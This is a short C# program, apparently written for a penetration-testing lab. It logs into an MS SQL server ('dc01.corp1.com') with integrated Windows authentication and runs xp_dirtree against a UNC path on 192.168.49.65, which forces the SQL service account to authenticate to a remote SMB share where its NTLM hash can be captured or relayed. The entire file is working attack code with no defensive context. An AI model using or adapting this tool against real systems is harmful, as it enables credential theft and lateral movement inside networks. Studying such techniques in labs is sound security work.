using System;
using System.Data.SqlClient;

namespace MS_SQL_UNC
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth Sccess!");
            }
            catch
            {
                Console.WriteLine("Auth Failed");
                Environment.Exit(0);
            }
            String query = "EXEC master..xp_dirtree\"\\\\192.168.49.65\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
